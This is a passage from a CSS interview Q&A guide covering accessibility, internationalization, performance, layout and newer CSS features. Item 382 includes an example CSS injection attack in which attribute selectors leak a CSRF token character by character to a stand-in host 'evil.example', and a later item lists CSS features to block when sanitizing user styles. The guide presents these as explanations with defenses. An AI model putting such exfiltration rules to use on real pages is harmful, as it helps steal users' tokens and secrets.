- `:has(:focus-visible)` to highlight a whole card when the link inside it is focused.
- `scroll-margin` so focused elements aren't hidden under sticky headers.
- `inert` (an HTML attribute) for background content when a custom modal is open. CSS can style `[inert]`.
- Avoid `order`, `flex-direction: row-reverse` and `grid-auto-flow: dense` when they would make the visual order differ from the focus order. The `reading-flow` property (Chromium) is a newer fix that makes focus order follow the visual flex or grid order.

```css
.card:has(a:focus-visible) {
  outline: 3px solid #4f46e5;
  outline-offset: 4px;
}
```

### 379: How should view transitions handle reduced motion?

The default crossfade is usually fine, but slide and zoom transitions should be toned down:

```css
@media (prefers-reduced-motion: reduce) {
  ::view-transition-group(*),
  ::view-transition-old(*),
  ::view-transition-new(*) {
    animation-duration: 0s !important;
  }
}
```

Or skip the transition in JavaScript:

```js
const reduce = matchMedia("(prefers-reduced-motion: reduce)").matches;
if (!document.startViewTransition || reduce) update();
else document.startViewTransition(update);
```

Scroll-driven animations need the same treatment, because motion tied to scrolling can be especially uncomfortable.

### 380: What should you watch for when supporting RTL at scale?

- Use logical properties everywhere (`margin-inline-start`, `inset-inline-end`, `text-align: start`). Lint for physical properties with Stylelint plugins.
- Directional icons (arrows, chevrons, "back") need mirroring with `:dir(rtl)` and `scale: -1 1`. Non-directional icons (checkmarks, logos, media "play") must not be mirrored.
- `transform: translateX()` and `background-position` aren't logical. Handle them on purpose.
- Mixed content (an English product name in Arabic text) may need `unicode-bidi: isolate` or `<bdi>`.
- Set `dir` on `<html>` (and on user-generated content with `dir="auto"`), not only in CSS. Screen readers and form fields use it.

### 381: What CSS issues come up with internationalization beyond RTL?

- **Text length**: German or Finnish can be 30-40% longer than English. Avoid fixed widths on buttons and tabs, and test with long strings.
- **Line breaking**: Chinese and Japanese text breaks between almost any characters. `word-break: keep-all` keeps Korean words together. `line-break: strict` controls breaking near punctuation.
- **Fonts**: CJK fonts are huge, so use system fonts or `unicode-range` subsets. Make sure `lang` is set so the browser picks the right glyphs (Japanese and Chinese share code points but differ in shape).
- **Vertical text**: `writing-mode: vertical-rl` for Japanese or Chinese layouts, with logical properties.
- **`text-transform: uppercase`** works differently by language (Turkish dotted i). It depends on `lang`.
- **Quotes**: `quotes: auto` uses the right quote marks for `lang`.

### 382: How can CSS be used to steal data?

If an attacker can inject CSS (but not JavaScript) into a page, they can still leak data with attribute selectors and background requests:

```css
input[name="csrf"][value^="a"] {
  background: url("https://evil.example/?c=a");
}
input[name="csrf"][value^="b"] {
  background: url("https://evil.example/?c=b");
}
/* ...one rule per character, repeated for each position */
```

When a rule matches, the browser loads the URL and tells the attacker one character. With `@import` chains or many requests, they can rebuild tokens character by character. Similar tricks use `@font-face` with `unicode-range` to detect which characters are on the page.

Defense: never allow user-controlled CSS without strict sanitization, use a CSP with `img-src`/`font-src`/`style-src` limits, and don't put secrets in attributes that CSS can read.

### 383: How does Content Security Policy affect CSS?

`style-src` controls which stylesheets and inline styles are allowed:

- Without `'unsafe-inline'`, `<style>` blocks and `style=""` attributes are blocked, unless the `<style>` has a matching `nonce` or hash.
- `style-src-elem` and `style-src-attr` let you set rules for `<style>`/`<link>` and `style` attributes separately.
- Setting styles from JavaScript through the CSSOM (`el.style.color = "red"`) is **not** blocked, only `setAttribute("style", ...)` is.

```http
Content-Security-Policy: style-src 'self' 'nonce-r4nd0m'; style-src-attr 'none'
```

Runtime CSS-in-JS libraries that inject `<style>` tags need nonce support configured, which is another reason teams move to static CSS.

### 384: What is clickjacking and how does CSS relate to it?

Clickjacking loads your site in a hidden or transparent iframe (with `opacity: 0` and `z-index` tricks) on top of an attacker's page, so users click your buttons without knowing. CSS is the attacker's tool here. The defense is on your server: send `Content-Security-Policy: frame-ancestors 'self'` (or `X-Frame-Options: DENY`) so other sites can't frame your page.

Inside your own site, watch for user-controlled styles that could place a transparent element over a "Delete" or "Pay" button.

### 385: How would you safely let users customise styles?

Don't accept raw CSS. Instead:

- Offer a limited set of options (theme colors, fonts, sizes) and write them as custom properties after validating each value against a strict pattern:

```js
const isHex = /^#[0-9a-f]{6}$/i.test(input);
if (isHex) container.style.setProperty("--user-accent", input);
```

- If you must allow CSS (a site builder, for example), parse it with a real CSS parser and allowlist properties. Block `url()`, `@import`, `expression()`, `behavior` and `-moz-binding` (old browsers), and selectors that match things outside the user's area.
- Put user styles in a sandboxed iframe or shadow root, with a CSP that blocks outgoing requests.

### 386: Why are `:visited` styles limited?

`:visited` could show which sites a user has been to: a script could check the computed color of links to see if they were visited. To stop this, browsers:

- Only allow a few properties in `:visited` (`color`, `background-color`, `border-color`, `outline-color`, `column-rule-color`, `fill`, `stroke`, text decoration color).
- Return the unvisited value from `getComputedStyle`.
- Don't let `:visited` affect layout, transparency or background images.

Newer browser versions also partition visited link history by site, so links only show as visited when they were visited from the same site.

### 387: What are the risks of loading third-party CSS?

A third-party stylesheet can:

- Change or hide anything on the page (fake login forms, hiding warnings).
- Leak data with attribute selectors and background URLs.
- Break your layout if the provider changes it.
- Slow down rendering, since it's render-blocking from another origin.

Self-host when you can. If you load from a CDN, use Subresource Integrity:

```html
<link
  rel="stylesheet"
  href="https://cdn.example.com/lib@1.2.3/lib.min.css"
  integrity="sha384-..."
  crossorigin="anonymous"
/>
```

Also pin exact versions and put vendor CSS in a low-priority cascade layer.

### 388: Why can't a container query check the container's own size, and why is `inline-size` the usual choice?

If an element could style itself based on its own size, a style change could change the size, which changes the style, and so on in a loop. To avoid that:

- You can only query an **ancestor** container, never the element itself.
- The container gets **size containment**, so its size doesn't depend on its children. That breaks the loop.

With `container-type: size`, the container can't get its height from its children, so it collapses unless you give it a height. With `inline-size`, the width is contained (it usually comes from the parent anyway), and the height still grows with content. That's why `inline-size` is the practical default.

### 389: How can you use style queries for component variants?

Style queries can react to a custom property set by a parent, without adding classes to every child.

```css
.card {
  --tone: neutral;
}
.card[data-tone="warning"] {
  --tone: warning;
}

@container style(--tone: warning) {
  .card__icon {
    color: darkorange;
  }
  .card__title::before {
    content: "⚠ ";
  }
}
```

This works well for themes and for passing context down, like "this button is inside a dark section". The children don't need to know about the parent's classes. Remember that only custom properties can be queried, and only in browsers that support style queries.

### 390: How do you use `:has()` for state-based styling, and what are the pitfalls?

```css
/* show a "has errors" state on the form */
form:has(:user-invalid) .submit {
  opacity: 0.5;
}

/* card is clickable if it contains a primary link */
.card:has(a.primary) {
  cursor: pointer;
}

/* change layout when a sidebar exists */
.layout:has(> .sidebar) {
  grid-template-columns: 250px 1fr;
}

/* style the previous sibling */
li:has(+ li:hover) {
  scale: 1.05;
}
```

Pitfalls:

- The specificity of `:has()` comes from its argument, so it can be higher than you expect.
- `:has()` can't be nested inside another `:has()`, and pseudo-elements can't be used inside it.
- Broad anchors (`body:has(...)`) on pages that change often can be slow.
- Logic hidden in CSS can surprise people who expect state to live in JavaScript. Document it.

### 391: What is the specificity gotcha with native nesting?

Nested rules act like the parent selector is wrapped in `:is()`. If the parent is a selector list with different specificities, every nested rule gets the **highest** one.

```css
.button,
#legacy-button {
  & span {
    color: red;
  }
}
/* same as :is(.button, #legacy-button) span → specificity (1,0,1) for both */
```

Now a `.button span` override elsewhere (0,1,1) loses even for normal buttons. Sass would have output `.button span, #legacy-button span`, each with its own specificity. Keep parent selectors in nesting simple and similar.

### 392: What are the pitfalls of where you put `&` in nested rules?

`&` can go anywhere, which changes the meaning:

```css
.card {
  .theme-dark & {
    background: #111;
  } /* .theme-dark .card */
  & & {
    margin: 0;
  } /* .card .card (nested cards) */
  &--compact {
  } /* does NOT mean .card--compact */
  :hover > & {
  } /* :hover > .card */
}
```

Things to watch:

- Placing `&` at the end flips the relationship: the parent becomes the descendant.
- Native CSS can't join strings, so BEM-style `&__title` or `&--compact` doesn't work. Teams moving from Sass often hit this.
- Declarations written after nested rules in the same block used to be moved up silently. The spec now keeps them in order (`CSSNestedDeclarations`), but older browser versions still move them.

### 393: How do `@import` with `layer()`, `supports()` and media conditions work together?

```css
@import url("theme.css") layer(theme) supports(color: oklch(0 0 0))
  (prefers-color-scheme: dark);
```

Order matters: URL, then `layer`, then `supports()`, then media queries. The file is loaded as part of layer `theme` only if the browser supports `oklch` and the media query matches. An anonymous `layer` with no name puts it in its own unnamed layer.

All `@import` rules must come before other rules, after `@charset` and `@layer` statements. Each import is still a separate request in the browser, so bundle them at build time.

### 394: How do you share breakpoints between CSS and JavaScript?

Custom properties can't be used inside media query conditions, so you need another approach:

- Keep breakpoints in a JSON or TS file and generate both Sass variables or `@custom-media` (with PostCSS) and a JS module from it.
- In JavaScript, use `matchMedia` with the same query strings:

```js
const md = window.matchMedia("(width >= 768px)");
md.addEventListener("change", (e) => setIsDesktop(e.matches));
```

- For component-level behavior, prefer container queries in CSS and `ResizeObserver` in JS, so you don't need viewport breakpoints in JS at all.

### 395: When do you use `matchMedia`, `ResizeObserver` or container queries?

- **Container queries**: purely visual changes based on a component's size. No JavaScript, so this is the first choice.
- **`ResizeObserver`**: JavaScript needs the size of an element, for example to pick a chart's tick count or to virtualize a list.
- **`matchMedia`**: JavaScript needs to know about viewport or user settings, like rendering a different component on mobile or respecting reduced motion in a JS animation.

Avoid `resize` event listeners that read layout every time they fire. Both observers batch their callbacks and avoid layout thrashing.

### 396: How do CSS animations compare to JavaScript animations?

- **CSS transitions and animations**: declarative and simple. Browsers can run `transform` and `opacity` on the compositor even when the main thread is busy. Hard to control in real time.
- **Web Animations API (WAAPI)**: the same engine as CSS animations, controlled from JS (`el.animate()`, `pause()`, `reverse()`, `finished` promise). Also runs on the compositor.
- **`requestAnimationFrame` libraries** (old-style GSAP, custom code): full control, physics and sequencing, but they run on the main thread, so they can jank when the page is busy. Modern GSAP and Motion use WAAPI where they can.

Use CSS for state changes, WAAPI for animations JS needs to control, and libraries for complex timelines.

### 397: What does `animation-composition` do?

It sets how an animation's value combines with the element's underlying value, or with other animations of the same property.

- `replace` (default): the animation value replaces the base value.
- `add`: the values are added together. For transforms, the functions are appended.
- `accumulate`: the values are combined numerically (`translateX(10px)` + `translateX(20px)` = `translateX(30px)`).

```css
.shake {
  transform: rotate(10deg);
  animation: nudge 300ms;
  animation-composition: add; /* keeps the 10deg rotation while nudging */
}
@keyframes nudge {
  50% {
    transform: translateX(5px);
  }
}
```

It's Baseline since 2023.

### 398: What is a CSS motion path?

`offset-path` moves an element along a path, and `offset-distance` sets how far along it is.

```css
.dot {
  offset-path: path("M 0 100 C 100 0, 200 200, 300 100");
  offset-rotate: auto; /* faces the direction of travel */
  animation: travel 3s ease-in-out infinite alternate;
}
@keyframes travel {
  from {
    offset-distance: 0%;
  }
  to {
    offset-distance: 100%;
  }
}
```

`offset-path` also accepts basic shapes like `circle()`, `ray()` and `url(#svg-path)`. Newer browsers support `shape()` too, which makes paths responsive.

### 399: What are scroll-state container queries?

They let CSS react to scroll-related state of a container, like whether a sticky element is stuck, a snap item is snapped, or a container can scroll.

```css
.header {
  position: sticky;
  top: 0;
  container-type: scroll-state;
}

@container scroll-state(stuck: top) {
  .header-inner {
    box-shadow: 0 2px 8px rgb(0 0 0 / 15%);
  }
}
```

Before this, you needed an `IntersectionObserver` with a sentinel element to detect "stuck". It's Chromium-only so far (since 133), so treat it as an extra on top of a working base.

### 400: What is scroll anchoring?

When content above the visible area changes size (like images or ads loading), browsers adjust the scroll position so the content the user is reading doesn't jump. This is scroll anchoring, and it's on by default in Chromium and Firefox. Safari support came later, so check caniuse if you rely on it.

```css
.chat-log {
  overflow-anchor: none;
} /* turn it off where you manage scroll yourself */
```

Turn it off for chat windows or infinite feeds where your own code controls scroll position, otherwise the two can fight.

### 401: How do you keep a large CSS codebase maintainable?

- **Linting**: Stylelint with rules for max specificity, no ids, allowed units, and logical properties.
- **Structure**: cascade layers plus a clear folder layout (tokens, base, components, utilities).
- **Scoping**: component styles live next to components (CSS Modules, `@scope` or similar), so deleting a component deletes its CSS.
- **Tokens only**: no raw colors or random spacing values in components. Lint for hex values outside token files.
- **Dead code checks**: coverage reports and unused-selector tools in CI.
- **Visual regression tests**: screenshot diffs (Playwright, Chromatic) catch side effects that code review misses.
- **Documentation**: a living style guide or Storybook showing every component state.

### 402: How should a component library write its CSS so apps can customise it?

- Keep specificity low: wrap selectors in `:where()`, or ship styles in a named layer (`@layer ui-lib`) so app styles win without `!important`.
- Expose **custom properties** as the public styling API (`--button-bg`, `--button-radius`) and document them.
- Use `::part()` for web components, and stable `data-*` or class hooks for others.
- Don't ship global resets or element selectors that affect the host app.
- Avoid hard-coded `z-index`. Use the top layer for overlays.
- Support `color-scheme`, logical properties, `prefers-reduced-motion` and forced colors by default.

### 403: How do you build a fluid spacing and type scale?

Interpolate between a minimum and maximum value across a viewport range, using `clamp()`:

```css
:root {
  /* 16px at 320px viewport, 20px at 1240px viewport */
  --step-0: clamp(1rem, 0.913rem + 0.435vw, 1.25rem);
  /* 20px to 28px */
  --step-1: clamp(1.25rem, 1.076rem + 0.87vw, 1.75rem);
  --space-s: clamp(1rem, 0.913rem + 0.435vw, 1.25rem);
  --space-m: clamp(1.5rem, 1.37rem + 0.652vw, 1.875rem);
}
```

The middle value comes from the line between the two points: `slope = (max - min) / (maxVw - minVw)`, then `intercept = min - slope × minVw`. Tools like Utopia generate full scales. Keep a `rem` part in the middle value so zoom still works. You can use `cqi` instead of `vw` to make the scale follow the container.

### 404: When do you choose CSS backgrounds versus `<img>`/`<picture>` for responsive images?

- **Content images** (product photos, the hero image as LCP): use `<img>` with `srcset`/`sizes`, or `<picture>` for different crops. The browser's preload scanner finds them early, they get alt text, and `loading="lazy"` and `fetchpriority` work.
- **Decorative images** (textures, patterns): use CSS backgrounds with `image-set()` and media queries.
- **Art direction** (a different crop on mobile): `<picture>` with `<source media>` is better than swapping backgrounds, because only one image downloads and it's in the HTML.

`object-fit` and `object-position` give `<img>` the same cropping control that `background-size: cover` gives backgrounds.

### 405: What advanced print features does CSS have?

```css
@page {
  size: A4 portrait;
  margin: 2cm 1.5cm;

  @bottom-right {
    content: "Page " counter(page) " of " counter(pages);
  }
}
@page :first {
  margin-top: 4cm;
}
@page landscape-table {
  size: A4 landscape;
}

.wide-table {
  page: landscape-table;
}
```

Margin boxes (`@top-center`, `@bottom-right` and so on) and named pages are newer in browsers. Chromium supports them, and other browsers have less support. Tools like Paged.js or PDF engines (Prince, WeasyPrint) support them fully, so complex PDF reports are often built with HTML and CSS through those tools.

### 406: Why is CSS for emails different?

Email clients have their own, often very old, rendering engines. Outlook on Windows uses Microsoft Word's engine. Common limits:

- `<style>` blocks may be stripped, so styles are inlined on each element (tools like Juice or MJML do this).
- No flexbox or grid in many clients. Layouts are built with nested `<table>`s.
- Limited or no support for custom properties, media queries (support varies), `position`, and web fonts.
- Background images need VML hacks for Outlook.

Use a framework like MJML or React Email that compiles to email-safe HTML, and test with tools like Litmus or Email on Acid.

### 407: How do you decide which browsers to support?

- Look at your real analytics, not global numbers. A B2B tool for banks and a consumer app in India have very different audiences.
- Set a `browserslist` config shared by your build tools (Autoprefixer, Lightning CSS, Babel):

```
> 0.5%, last 2 versions, not dead, Firefox ESR
```

- Or target Baseline: `browserslist` supports queries like `baseline widely available`.
- Agree on what "support" means: fully working, or working with a simpler look (progressive enhancement).
- Write the policy down, so feature decisions don't get argued from scratch every time.

### 408: Why are CSS polyfills hard to write?

CSS features are part of the browser's style and layout engine. A polyfill in JavaScript has to:

1. Download and parse the CSS again, because browsers throw away rules they don't understand.
2. Find matching elements and watch for DOM changes.
3. Recalculate on resize, scroll or state changes, on the main thread.

That's slow, often incomplete, and can cause flicker. Some features can be compiled away at build time instead (nesting, `oklch()` with fallbacks, media range syntax via PostCSS or Lightning CSS). For layout features like container queries or anchor positioning, polyfills exist but have limits. Progressive enhancement is usually better than polyfilling.

### 409: How do you detect CSS support from JavaScript?

```js
if (CSS.supports("anchor-name", "--a")) {
  // use CSS anchor positioning
} else {
  // load a positioning library
}

CSS.supports("display: grid"); // single string form
CSS.supports("selector(:has(a))"); // selectors
```

`CSS.supports()` uses the same parser as `@supports`. It checks if the browser **parses** the value, not if the feature fully works. A browser could parse a property but have bugs in it.

### 410: What does `@supports selector()` let you do?

It checks if a selector is supported, so you can use new selectors safely:

```css
/* fallback: JS adds .has-image */
.card.has-image {
  padding: 0;
}

@supports selector(:has(img)) {
  .card:has(img) {
    padding: 0;
  }
}
```

This matters because an unsupported selector in a list makes the whole rule invalid. Wrapping it in `@supports selector()` or using the forgiving `:is()` stops it from breaking other selectors.

### 411: A page has a horizontal scrollbar on mobile. How do you find the cause?

1. In DevTools, run this in the console to list elements wider than the viewport:

```js
[...document.querySelectorAll("*")].filter(
  (el) =>
    el.getBoundingClientRect().right > document.documentElement.clientWidth,
);
```

2. Chrome's Elements panel shows a "scroll" badge on scroll containers. Also check the Layout pane.
3. Typical causes: `width: 100vw` (includes the scrollbar), a fixed-width element, long unbroken text or URLs, a negative margin, a transformed element off-screen, a `pre` or `table` without `overflow-x: auto`, or a grid column with an `auto` minimum.
4. Fix the cause. `overflow-x: hidden` on `body` hides the symptom, and it can break `position: sticky`. Use `overflow-x: clip` if you must.

### 412: Why does a `100vh` section cut off content on mobile, and how do you fix it?

On mobile browsers, `100vh` equals the **largest** viewport (with toolbars hidden). When the toolbars are showing, the bottom part of a `100vh` section is hidden behind them.

```css
.hero {
  min-height: 100vh; /* fallback */
  min-height: 100svh; /* fits the smallest visible viewport */
}
```

Use `svh` for things that must fit on screen, `lvh` for backgrounds that can be cut off, and `dvh` only when you want it to follow the toolbar (it can cause layout jumps while scrolling). Use `min-height` instead of `height` so content can still grow.

### 413: How do you handle hover styles that "stick" on touch devices?

On touch screens, a tap triggers `:hover`, and it can stay until the user taps somewhere else. Wrap hover-only effects in a media query:

```css
@media (hover: hover) and (pointer: fine) {
  .card:hover {
    translate: 0 -4px;
    box-shadow: var(--shadow-lg);
  }
}
.card:active {
  scale: 0.98;
} /* feedback for touch */
```

Never put essential actions behind hover only. Make sure there's always a visible or focusable way to reach them.

### 414: How do you lock page scroll when a modal is open without layout shift?

```css
html:has(dialog[open]:modal) {
  overflow: hidden;
  scrollbar-gutter: stable; /* keeps the scrollbar space so content doesn't move */
}

dialog {
  overscroll-behavior: contain;
  max-height: 85dvh;
  overflow: auto;
}
```

Older approaches added padding equal to the scrollbar width with JavaScript. `scrollbar-gutter: stable` removes the need for that. On iOS Safari, `overflow: hidden` on the root has historically not stopped touch scrolling, which is why some libraries still use `position: fixed` on `body` and restore the scroll position afterward.

### 415: Animations stutter on cheap Android phones. How do you investigate?

1. Record in the Performance panel with CPU throttling, or better, use remote debugging on the real device.
2. Look for long frames. Is the time in scripting, style, layout or paint?
3. Check what's animated. Only `transform` and `opacity` should animate. Layout properties, `box-shadow` or `filter: blur()` on large areas are expensive.
4. Turn on **paint flashing** and **layer borders** to spot big repaints and too many layers.
5. Check for `backdrop-filter`, large fixed backgrounds, or huge images being scaled.
6. Reduce the work: smaller animated areas, fake shadows with a pseudo-element whose `opacity` animates, drop blur on mobile, and respect `prefers-reduced-motion`.

### 416: After adding `:has()` selectors, style recalculation got slow. What do you do?

1. Record a Performance trace, find the long "Recalculate Style" blocks, and turn on "Enable CSS selector stats" in Chrome to see which selectors are expensive.
2. Look for broad anchors, like `body:has(.modal-open)` or `:has()` on elements with huge subtrees, combined with frequent DOM changes (timers, live data, hover).
3. Make the anchor closer and more specific (`.modal-root:has(> dialog[open])`) and use `>` or `+` inside `:has()` instead of a descendant search.
4. If a state changes often, toggling a class or data attribute from JavaScript may be cheaper than a `:has()` check over a big tree.
5. Measure again after each change.

### 417: A third-party widget is breaking your styles, or your styles are breaking it. What are your options?

**Your styles leak into the widget:**

- Scope your global styles (avoid bare element selectors, or use `:where(.app) a`).
- Put your styles in layers and leave the widget's CSS unlayered, or the other way round, so you control which wins.
- If the widget supports Shadow DOM or an iframe, use it.

**The widget leaks into your app:**

- Load its CSS into a low-priority layer: `@import url("widget.css") layer(vendor);`.
- If it uses `!important` or global resets, render it inside an iframe or a shadow root.
- As a last resort, override with more specific selectors or `all: revert-layer` on a wrapper.

### 418: How do you handle images and shadows in dark mode?

- **Shadows**: dark shadows on a dark background are invisible. Use lighter surface colors to show elevation instead, or use subtle light borders.
- **Images**: very bright photos can be harsh. You can dim them slightly:

```css
@media (prefers-color-scheme: dark) {
  img:not([src$=".svg"]) {
    filter: brightness(0.9);
  }
}
```

- **Logos and icons**: provide dark versions with `<picture><source media="(prefers-color-scheme: dark)">`, or use SVG with `currentColor`.
- **Pure black backgrounds**: they cause smearing on OLED screens when scrolling and look harsh. Use a dark gray like `#121212`.
- **Contrast**: check each token pair again in dark mode. A color that passes on white often fails on dark gray.

### 419: How do you make cards in a row line up their titles, text and buttons?

Use subgrid, so each part of every card shares the same row tracks:

```css
.cards {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(min(18rem, 100%), 1fr));
  gap: 1.5rem;
}
.card {
  display: grid;
  grid-row: span 3;
  grid-template-rows: subgrid;
  gap: 0.75rem;
}
/* card children: .card__title, .card__body, .card__actions */
```

Each row's height is set by the tallest title, body or footer in that row of cards. Without subgrid, the fallback is a column flexbox with `margin-top: auto` on the actions, which aligns buttons but not titles.

### 420: How do you make a data table work on small screens?

Options, from simple to complex:

1. **Horizontal scroll**: wrap it with `overflow-x: auto`, and make the first column sticky. Simple, and it keeps the table's meaning.

```css
.table-scroll {
  overflow-x: auto;
}
.table-scroll th:first-child,
.table-scroll td:first-child {
  position: sticky;
  left: 0;
  background: var(--bg);
}
```

2. **Stacked cards**: on small screens, show each row as a block and use `data-label` with `::before` for column names. This breaks the table semantics if you change `display` on table elements, so add ARIA roles back (`role="table"`, `role="row"`, `role="cell"`).
3. **Hide less important columns** with container queries and offer a way to show them.

Option 1 is usually the best default.

### 421: A layout with a sidebar breaks when the sidebar content is wide. How do you fix it?

```css
.layout {
  display: grid;
  grid-template-columns: minmax(0, 16rem) minmax(0, 1fr);
}

/* or, with intrinsic wrapping and no media query */
.with-sidebar {
  display: flex;
  flex-wrap: wrap;
  gap: 1rem;
}
.with-sidebar > .sidebar {
  flex-basis: 16rem;
  flex-grow: 1;
}
.with-sidebar > .main {
  flex-basis: 0;
  flex-grow: 999;
  min-width: 60%;
}
```

The second pattern (from "Every Layout") puts the sidebar above the main content when the main area would get narrower than 60%. Both use `minmax(0, …)` or `min-width` to stop wide content from making tracks wider than planned.

### 422: A dropdown inside an `overflow: hidden` card gets cut off. How do you fix it?

`overflow: hidden` clips descendants, unless they're positioned relative to something outside the clipping element. Options:

1. **Top layer**: make the dropdown a `popover`. It escapes all clipping and stacking contexts. Position it with anchor positioning (or a JS library where that isn't supported).
2. **Portal**: render the dropdown at the end of `body` and position it with JS.
3. **Change the card**: use `overflow: clip` with `overflow-clip-margin`, or only clip a specific inner element (like the image) instead of the whole card.
4. Make the dropdown `position: fixed`, but that breaks if an ancestor has a transform.

Option 1 is the modern answer.

### 423: How do you align icons with text?

- **Flexbox** for a button or label with an icon: `display: inline-flex; align-items: center; gap: 0.5em;`.
- **Inline icons in running text**: size them with `em` and nudge them:

```css
.icon {
  width: 1em;
  height: 1em;
  vertical-align: -0.125em;
}
```

- **Newer units**: `1cap` (cap height) and `1lh` (line height) help size icons to match capital letters or to sit exactly on one line.

```css
.icon {
  height: 1cap;
  width: auto;
}
.list-item::before {
  height: 1lh;
}
```

Using `em` and `cap` keeps icons aligned when font size changes.

### 424: What are the `lh`, `rlh`, `cap` and `ic` units?

- `lh`: the element's computed `line-height`. `rlh` is the root element's line height.
- `cap`: the height of capital letters in the current font.
- `ic`: the width of the CJK "water" ideograph (水), which helps size CJK text.
- Root versions also exist for other font units: `rem`, `rcap`, `rch`, `rex`, `ric`.

```css
textarea {
  min-height: 3lh;
} /* exactly three lines */
.prose > * + * {
  margin-top: 1rlh;
} /* vertical rhythm */
.badge {
  height: 1cap;
}
```

`lh` and `rlh` are Baseline since 2023. `cap` and the other root font units are newer.

### 425: How do viewport units behave with scrollbars and the on-screen keyboard?

- `100vw` includes the vertical scrollbar on desktop, so `width: 100vw` causes a horizontal scrollbar when the page scrolls vertically. Use `100%` instead. `100dvw` has the same problem, and `scrollbar-gutter` doesn't change `vw`.
- When the on-screen keyboard opens on mobile, browsers by default resize the **visual** viewport, not the layout viewport. So `dvh` doesn't shrink, and fixed bottom bars may end up behind the keyboard.
- The viewport meta key `interactive-widget=resizes-content` makes the layout viewport shrink instead (Chromium and Firefox), so `dvh` and fixed elements adjust.

```html
<meta
  name="viewport"
  content="width=device-width, initial-scale=1, interactive-widget=resizes-content"
/>
```

The JavaScript `visualViewport` API gives exact sizes when CSS isn't enough.

### 426: What does the CSS `zoom` property do now?

`zoom` scales an element **and** its layout space. `transform: scale()` only scales it visually, while the original space stays the same. It used to be non-standard (old IE and WebKit), but it was standardized and Firefox added it in 2024, so it now works in all major browsers.

```css
.preview {
  zoom: 0.5;
} /* takes half the space, unlike scale(0.5) */
```

It's handy for thumbnails and previews. Be careful: it affects all lengths inside, and how it interacts with things like `getBoundingClientRect()` was cleaned up only recently.

### 427: How do you choose between cascade layers, `@scope` and CSS Modules?

They solve different problems and work well together:

- **CSS Modules**: unique class names at build time. They stop name collisions between components. Needs a bundler.
- **`@scope`**: limits where selectors apply in the DOM (with an optional lower limit) and adds proximity. Good for styling markup you don't fully control, like CMS content. No build step.
- **Cascade layers**: decide which **group** of styles wins (reset vs components vs utilities vs vendor). They don't scope anything, they set priority.

A common modern setup: layers for overall order, CSS Modules (or a utility framework) for components, and `@scope` for prose or embedded content.

### 428: How would you migrate a large Sass codebase to modern CSS?

Do it in steps, not as a big rewrite:

1. Move from Sass `@import` to `@use`/`@forward` (the Sass migrator does most of it), because `@import` is going away.
2. Turn Sass color and spacing variables into **CSS custom properties** generated from tokens. Sass can still emit them during the move.
3. Replace Sass color functions (`darken`, `lighten`) with `color-mix()` or relative color syntax.
4. Introduce **cascade layers** around existing groups of files to tame specificity.
5. Replace nesting gradually with native nesting, avoiding BEM string joining (`&__`), which has no native equivalent.
6. Keep Sass where it still adds value (loops, mixins, build-time logic), or drop it once nothing needs it.
7. Run visual regression tests at each step.

### 429: What do you look for when reviewing a CSS pull request?

- **Specificity and scope**: no ids, no deep selectors, no new global element styles, and `!important` only with a reason.
- **Tokens**: no raw colors, sizes or `z-index` numbers that bypass the design system.
- **Layout**: works at narrow and wide sizes, with long text, with no content, and with different languages.
- **Accessibility**: focus styles, contrast, reduced motion, forced colors, and visual order matching DOM order.
- **Performance**: animating cheap properties, no huge `will-change`, no large background images in CSS for the LCP.
- **Browser support**: new features have fallbacks or `@supports`.
- **Dead code**: removed markup has its CSS removed too.

Ask for screenshots or a preview link. CSS is much easier to review when you can see it.

### 430: How do you measure CSS performance?

- **Performance panel** (Chrome DevTools): look at time spent in "Recalculate Style", "Layout", "Paint" and "Composite Layers" during load and interactions. Turn on selector stats to find expensive selectors.
- **Coverage tab**: unused CSS bytes.
- **Rendering panel**: paint flashing, layout shift regions, layer borders and the FPS meter.
- **Lighthouse / PageSpeed Insights**: render-blocking resources, unused CSS, CLS and LCP.
- **Real user data**: Core Web Vitals from CrUX or your RUM tool, especially INP and CLS.
- **Bundle size**: track CSS size in CI so it doesn't grow without anyone noticing.

### 431: How can CSS affect Interaction to Next Paint (INP)?

INP measures how long it takes from a user interaction to the next frame being painted. CSS adds to that time when an interaction causes:

- Large style recalculations, like toggling a class on `body` or `html` that many selectors depend on, or changing an inherited custom property at the root.
- Big layout work, like opening a menu that pushes the whole page down, or a huge DOM with no containment.
- Expensive paint, like large blurs, shadows or `backdrop-filter`.

Fixes: toggle state as close to the affected element as you can, use `contain`/`content-visibility` for heavy sections, register frequently-changed custom properties with `inherits: false`, and keep interaction feedback cheap (a `transform` or `opacity` change).

### 432: What is the `shape()` function?

`shape()` describes a path like SVG's `path()`, but with CSS syntax and units. You can use `%`, `rem`, `calc()` and custom properties, so shapes can be responsive.

```css
.wave {
  clip-path: shape(
    from 0 0,
    line to 100% 0,
    line to 100% 85%,
    curve to 0 85% with 50% 100%,
    close
  );
}
```

`path()` only accepts fixed pixel coordinates, so it doesn't scale with the element. `shape()` works in `clip-path` and `offset-path`. It's in Chromium and Safari and is part of Interop 2026.

### 433: What is the difference between computed, used and resolved values?

- **Specified value**: what the cascade picks, or the inherited or initial value.
- **Computed value**: the specified value turned into an absolute form where possible, without doing layout. `em` becomes `px`, and relative URLs become absolute. Percentages for `width` stay percentages. This is what children inherit.
- **Used value**: the final value after layout, like `width: 50%` becoming `437.5px`.
- **Actual value**: the used value after rounding to device pixels or fitting font limits.
- **Resolved value**: what `getComputedStyle()` returns. For most properties it's the computed value, but for layout properties like `width`, `height`, `margin` and `top`, it's the used value.

This explains why `getComputedStyle(el).width` gives pixels even when you wrote a percentage, and why reading it can force layout.

### 434: Why does inheritance use the computed value, and when does that cause bugs?

Children inherit the parent's **computed** value, not the specified one. Examples where that matters:

- `line-height: 1.5em` on a parent computes to a pixel value, and children with bigger fonts inherit that small fixed number. `line-height: 1.5` (unitless) is inherited as the number, so it works.
- `font-size: 2em` nested several levels gets bigger and bigger, because each level is relative to the parent's computed size. `rem` avoids this.
- Custom properties inherit their computed value too. If `--size: calc(var(--base) * 2)` is set on `:root`, changing `--base` on a child doesn't change `--size` there. Define derived variables on the element where you change the base, or use `*` (with care).

### 435: How does a CSS-only toggle (checkbox hack) compare to modern options?

The old "checkbox hack" used a hidden checkbox and `:checked ~ .panel` to toggle things without JavaScript. It had accessibility problems: wrong semantics, and keyboard and screen reader confusion.

Modern options give you the same "no JS" behavior with proper semantics:

- `<details>`/`<summary>` for disclosure and accordions (with `name` for exclusive groups).
- `popover` with `popovertarget` for menus and tooltips.
- `<dialog>` with invoker commands (`command="show-modal"`, `commandfor`), which are newer.
- `:has()` to style a parent based on a real form control's state.

